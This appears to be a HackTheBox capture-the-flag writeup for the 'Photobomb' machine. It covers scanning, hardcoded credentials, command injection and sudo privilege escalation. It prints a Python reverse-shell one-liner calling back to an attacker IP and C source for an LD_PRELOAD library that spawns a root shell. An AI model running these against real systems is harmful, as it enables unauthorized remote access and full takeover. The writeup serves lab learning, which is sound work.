---
title: Photobomb HackTheBox Writeup
tags: [hackthebox,find,linux,ld_preload,setenv,command-injection,sinatra]
style: border
color: success
description: ""
---

 [![](https://blogger.googleusercontent.com/img/a/AVvXsEjrdlB4DYQ2__-_3TeiMeRSuqI7VGlqGfxroswbtOdvCxU3kdFzsotu0N7W-4JTtz8B6Q4W6uv8P6ouLUBGJuJI9S1EsKGmWU0H-dJxT5PomMPPXTFysCIRRC_RbDq-XLuFai228WGxUOHFZf197nzE98Qd2-cgQ4seRP8JnuM-P_00Qpj5txsucbUxzQ=w640-h485)](https://blogger.googleusercontent.com/img/a/AVvXsEjrdlB4DYQ2__-_3TeiMeRSuqI7VGlqGfxroswbtOdvCxU3kdFzsotu0N7W-4JTtz8B6Q4W6uv8P6ouLUBGJuJI9S1EsKGmWU0H-dJxT5PomMPPXTFysCIRRC_RbDq-XLuFai228WGxUOHFZf197nzE98Qd2-cgQ4seRP8JnuM-P_00Qpj5txsucbUxzQ)

  

Scanning
========

We launch **nmap** tool with scripts and versions on all ports.

[![](https://blogger.googleusercontent.com/img/a/AVvXsEg-Jnb7qaky0s8DG9KNWgj4EKtPPzwU-sLKVDD2mgF4Qj6tmchIZI2X4tn6T-7YbuYKk6vbhaXAvhZSIgqhMW2pJtnwnlqJuVtG05os6ZFG-Xcbc-RpEYFX0YR5naQZZ4j8AfQdhBi6XQLb5Sope4Hov6rWXOcZhTN_ZgxcfpNmao4eU85l-dlo7Xwmmg=w640-h200)](https://blogger.googleusercontent.com/img/a/AVvXsEg-Jnb7qaky0s8DG9KNWgj4EKtPPzwU-sLKVDD2mgF4Qj6tmchIZI2X4tn6T-7YbuYKk6vbhaXAvhZSIgqhMW2pJtnwnlqJuVtG05os6ZFG-Xcbc-RpEYFX0YR5naQZZ4j8AfQdhBi6XQLb5Sope4Hov6rWXOcZhTN_ZgxcfpNmao4eU85l-dlo7Xwmmg)

  
We see that nmap shows us the domain "_photobomb.htb_", so we include it in our _"/etc/hosts_" file.

  

Enumeration
===========

We access the website:

[![](https://blogger.googleusercontent.com/img/a/AVvXsEjc-AHBoey4mJBe0644pDCurv7hmz_E9fm_KL8T8gGBjBG79LvrBNZ3-9kHuhd0HYtpcAkLECzpNTqPw60Zc0TNPng9UPH6UCVyy8yrQ35KGZ_pJRhBbNfmz3smdl61lFzPoXOP72dhPJxmjZgrIPAL_aSUUvZR59qK4TVy_kediDY__CwJFQXUzQ66bA=w603-h640)](https://blogger.googleusercontent.com/img/a/AVvXsEjc-AHBoey4mJBe0644pDCurv7hmz_E9fm_KL8T8gGBjBG79LvrBNZ3-9kHuhd0HYtpcAkLECzpNTqPw60Zc0TNPng9UPH6UCVyy8yrQ35KGZ_pJRhBbNfmz3smdl61lFzPoXOP72dhPJxmjZgrIPAL_aSUUvZR59qK4TVy_kediDY__CwJFQXUzQ66bA)

  
If we try to access the link, we are asked for access credentials:

[![](https://blogger.googleusercontent.com/img/a/AVvXsEilOeSKpvdBvT-kBRYbLVF14tH0jsrGK6MgkC3VFwwiZbQZ-1KPR9QM2PQ8jYX3nAmJelow2iI1drtSSNCwSkO5zehdLjN6noeD3Nr8DNh6Pqx3_e_Nuv3MFdTJiOcL5SZhn3mrzDK8vINdgFoM6Xa7uLmb_QiVz8MmPliWziex1_VBkfJMjrpSmKe84A=w640-h418)](https://blogger.googleusercontent.com/img/a/AVvXsEilOeSKpvdBvT-kBRYbLVF14tH0jsrGK6MgkC3VFwwiZbQZ-1KPR9QM2PQ8jYX3nAmJelow2iI1drtSSNCwSkO5zehdLjN6noeD3Nr8DNh6Pqx3_e_Nuv3MFdTJiOcL5SZhn3mrzDK8vINdgFoM6Xa7uLmb_QiVz8MmPliWziex1_VBkfJMjrpSmKe84A)

We review the source code, find the file "_photobomb.js_" and inside it some hardcoded credentials:

[![](https://blogger.googleusercontent.com/img/a/AVvXsEhs1QQN9c9gJ4TQkrVr-m1FmG4MR9iMoJTQquNVXzPoHvGKYY4BE7qFXfZAx6b3pRo2M1yS4RQ4SgLle117Wz8LXa2W7_ID4tszxPYqv4eNPrdXkKadEeTe4WuY1C2S2IQmavbcjGMe0OCz4YRvr2UIlnTKRSbJTjVK_GBfprurI0ni6ZKhExuwGnL4Mg=w640-h142)](https://blogger.googleusercontent.com/img/a/AVvXsEhs1QQN9c9gJ4TQkrVr-m1FmG4MR9iMoJTQquNVXzPoHvGKYY4BE7qFXfZAx6b3pRo2M1yS4RQ4SgLle117Wz8LXa2W7_ID4tszxPYqv4eNPrdXkKadEeTe4WuY1C2S2IQmavbcjGMe0OCz4YRvr2UIlnTKRSbJTjVK_GBfprurI0ni6ZKhExuwGnL4Mg)

  
We enter the credentials, see that they work and it takes us to a kind of image gallery.

[![](https://blogger.googleusercontent.com/img/a/AVvXsEg7HQGxyIDesOC-tyb-VAqd7ZEDfVwMbKL9daXS5ZsVFt815HVuygv1fnOVa1MQ9MSbDexhX9VQHTTIiC1z1O58r1pcM9NDIuhi4ifZOZqPIN5lg3jvArAi1Ap72RyzjURzlzdXjfBogJCgWq4B0Hb13vOVyMmbO8nCI5zhHAIylvm5BaDyWoQ8tvT_yQ=w640-h551)](https://blogger.googleusercontent.com/img/a/AVvXsEg7HQGxyIDesOC-tyb-VAqd7ZEDfVwMbKL9daXS5ZsVFt815HVuygv1fnOVa1MQ9MSbDexhX9VQHTTIiC1z1O58r1pcM9NDIuhi4ifZOZqPIN5lg3jvArAi1Ap72RyzjURzlzdXjfBogJCgWq4B0Hb13vOVyMmbO8nCI5zhHAIylvm5BaDyWoQ8tvT_yQ)

  
The machine is slow, I don't know if it's like that, but fuzzing is not the best ally in this occasion, I tried to put a slash "_/printer/"_ and I saw that it returned an error where it tried to load an image in an internal port and to the directory "_\_\_sinatra\_\__":

[![](https://blogger.googleusercontent.com/img/a/AVvXsEgU_GyIwPoO8ovAeltu4pI7Dbm4Z0uDt9kE-I--HZlZjWKJCYhzTcHdw5FoofVzs2bflk9DbTyRNULW5Xxb_XVV0T4zJfjZrdPCIG8ptl_HEV6uTVWrM67R3trt1jsCltSA5bkV1jI3_eANbvryVn7p01CwSawHfIXdo17FpjjplBr6y-8lZrAnoBWHGA=w640-h495)](https://blogger.googleusercontent.com/img/a/AVvXsEgU_GyIwPoO8ovAeltu4pI7Dbm4Z0uDt9kE-I--HZlZjWKJCYhzTcHdw5FoofVzs2bflk9DbTyRNULW5Xxb_XVV0T4zJfjZrdPCIG8ptl_HEV6uTVWrM67R3trt1jsCltSA5bkV1jI3_eANbvryVn7p01CwSawHfIXdo17FpjjplBr6y-8lZrAnoBWHGA)

  
  

Exploitation
============

From the name of the machine, I assumed that the entry point or vulnerability would have to be in the one thing it had, downloading images.

[![](https://blogger.googleusercontent.com/img/a/AVvXsEjeBiE2pkDvl-HjlyUZcNJi0pjQ0z0FsUblpr4X_71hSjmp5--2ipWWP_cTd5Kr_GJeel-4HaUDOaZP-hfVBEa1jtroe11jyC9NGGMSocdN7Q-luo4xel2bTRe0wmRpngQg5ODYw-n19LH4UDUxEu2BZCzs4hASwenF9N5D7ZE9HPZJ29KJ33ifbO38Wg=w640-h392)](https://blogger.googleusercontent.com/img/a/AVvXsEjeBiE2pkDvl-HjlyUZcNJi0pjQ0z0FsUblpr4X_71hSjmp5--2ipWWP_cTd5Kr_GJeel-4HaUDOaZP-hfVBEa1jtroe11jyC9NGGMSocdN7Q-luo4xel2bTRe0wmRpngQg5ODYw-n19LH4UDUxEu2BZCzs4hASwenF9N5D7ZE9HPZJ29KJ33ifbO38Wg)

  
As we saw before, it makes a _GET_ to download the photo, so even if we see the code, we could try to escape and execute malicious code..

### Request:

[![](https://blogger.googleusercontent.com/img/a/AVvXsEgggVq3gqlLJk6K8SiTu5BTPRImY-ypLkUhlhH2beFP5kv_JliwkSykeUC7ugHEQnd7D-AZALnzldwGYeqQ356MaxAwFLGK7cPs5MZVVoyQWVWBakVXf254FGitZgg_bWYFSIa9MTQwKWNz01AMRtRNy-MCZcVPptjVy1ruK5ozp-dwnwtNqNXcJJpMsA=w640-h282)](https://blogger.googleusercontent.com/img/a/AVvXsEgggVq3gqlLJk6K8SiTu5BTPRImY-ypLkUhlhH2beFP5kv_JliwkSykeUC7ugHEQnd7D-AZALnzldwGYeqQ356MaxAwFLGK7cPs5MZVVoyQWVWBakVXf254FGitZgg_bWYFSIa9MTQwKWNz01AMRtRNy-MCZcVPptjVy1ruK5ozp-dwnwtNqNXcJJpMsA)

  

### Command injection request:

[![](https://blogger.googleusercontent.com/img/a/AVvXsEgiekaYT-yFA64oL7k-aFHvb4c4LTWPm1wUOZ-BcWUmz7A5gJ--Tskcg4XjYnRNYI50Y6m77p41q-vceAhLlbJIPX0G7t943SX7MkNzd3UItNYcvrAb-xy7UjPx1CGr0Y26vVibHvhIUghOrhd-8s1Zt6XlE7utXc0QpgiC9rXx6a78kdXriUK7KiCCtw=w640-h288)](https://blogger.googleusercontent.com/img/a/AVvXsEgiekaYT-yFA64oL7k-aFHvb4c4LTWPm1wUOZ-BcWUmz7A5gJ--Tskcg4XjYnRNYI50Y6m77p41q-vceAhLlbJIPX0G7t943SX7MkNzd3UItNYcvrAb-xy7UjPx1CGr0Y26vVibHvhIUghOrhd-8s1Zt6XlE7utXc0QpgiC9rXx6a78kdXriUK7KiCCtw)

  

Since I was able to inject a command, I tried several reverse shells, but this was the only one that worked.

### Reverse shell:

     export RHOST="10.10.14.13";export RPORT=443;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'  
    

We gain access to the machine, enumerate the user and read the user flag:

[![](https://blogger.googleusercontent.com/img/a/AVvXsEhiGOE6XPI0ZRtt3wrPIbM3roWTXQXol6ywLJ6ZHSBHrtqjO5MM23mvRnxjn3UbHjhOW15X5IcVvWGPaX0rLH0WYNVOZFqBxXh_KfvwCBGXBrEum9MmxSwE8CAvnJ0t16sfvkAYVsBH4lO6TBCncqD2ek69vo3R5AjZLYHLJKPPbOY9Pt0Sa6eti9xFCA=w640-h380)](https://blogger.googleusercontent.com/img/a/AVvXsEhiGOE6XPI0ZRtt3wrPIbM3roWTXQXol6ywLJ6ZHSBHrtqjO5MM23mvRnxjn3UbHjhOW15X5IcVvWGPaX0rLH0WYNVOZFqBxXh_KfvwCBGXBrEum9MmxSwE8CAvnJ0t16sfvkAYVsBH4lO6TBCncqD2ek69vo3R5AjZLYHLJKPPbOY9Pt0Sa6eti9xFCA)

  
  

Privilege Escalation
====================

We do a "_sudo -l_" and list that we can run as root the script "_/opt/cleanup.sh_".

[![](https://blogger.googleusercontent.com/img/a/AVvXsEipWBWYXwDV4cjkp3nJ8PKAgBzIcawDkAbT7AuqlWUZW_aZazadRROIdhPKP-Y0jQMtrRq4wpz4yVHeRQoci2yqgUYw4w9ijwqFHJBvPinihJsNaTJXlr2zlCg5aDyesuoyUiwSvUeutwDnBfYrKf-KPYjSin2MsWrGMdKmmbeCnK5930-IExm8vGPG8A=w640-h368)](https://blogger.googleusercontent.com/img/a/AVvXsEipWBWYXwDV4cjkp3nJ8PKAgBzIcawDkAbT7AuqlWUZW_aZazadRROIdhPKP-Y0jQMtrRq4wpz4yVHeRQoci2yqgUYw4w9ijwqFHJBvPinihJsNaTJXlr2zlCg5aDyesuoyUiwSvUeutwDnBfYrKf-KPYjSin2MsWrGMdKmmbeCnK5930-IExm8vGPG8A)

  
We see that _SETENV_ does not require a password, this can be exploited with "_LD\_Preload_" by injecting it next to the script and getting it to run with the internal **find**:

[![](https://blogger.googleusercontent.com/img/a/AVvXsEi3cJ9TxO1Yai8An9NJXdnPp8COzy1NOkhAr41gCF6gfuonQ5OZn1GkSSnskcnJZBMflmgPJlpvwMDnrwbvtB4Dn2GHCJ1Dz_U7zfn9hmwcYXZVcWcNZdsmkbsanxGAVQLliR_FR72QauJIzsDUO5Gb-NU3iUMWK6ecp4Bls5jSp6whwx8kXoMVndW7Kw=w640-h302)](https://blogger.googleusercontent.com/img/a/AVvXsEi3cJ9TxO1Yai8An9NJXdnPp8COzy1NOkhAr41gCF6gfuonQ5OZn1GkSSnskcnJZBMflmgPJlpvwMDnrwbvtB4Dn2GHCJ1Dz_U7zfn9hmwcYXZVcWcNZdsmkbsanxGAVQLliR_FR72QauJIzsDUO5Gb-NU3iUMWK6ecp4Bls5jSp6whwx8kXoMVndW7Kw)

  

### Exploit code:

     #include <stdio.h>  
     #include <sys/types.h>  
     #include <stdlib.h>  
     void _init() {  
     unsetenv("LD_PRELOAD");  
     setgid(0);  
     setuid(0);  
     system("/bin/sh");  
     }  
    

  

We download the file "_exploit.so_" in temporary and run it together with the script with **SUDO**, we see that we escalate privileges to root and read the flag.

  

[![](https://blogger.googleusercontent.com/img/a/AVvXsEjSJb3WKldkM5WCYVL9hLpHIc1RUSOddQNHr0Ukvhn85HMse3ncQmUv4u5aCih16E6VfmCWgWnY3s0g_0fiVajo6POVHIWPqffSDbP3P1ksQik3PJwfYtiJOObRGYVU7igVBDh0dspEHRbp6NafmQFRPcrw_j58JresNH3Nt8SBcCPtmbKGMLd6yEm3JQ=w640-h213)](https://blogger.googleusercontent.com/img/a/AVvXsEjSJb3WKldkM5WCYVL9hLpHIc1RUSOddQNHr0Ukvhn85HMse3ncQmUv4u5aCih16E6VfmCWgWnY3s0g_0fiVajo6POVHIWPqffSDbP3P1ksQik3PJwfYtiJOObRGYVU7igVBDh0dspEHRbp6NafmQFRPcrw_j58JresNH3Nt8SBcCPtmbKGMLd6yEm3JQ)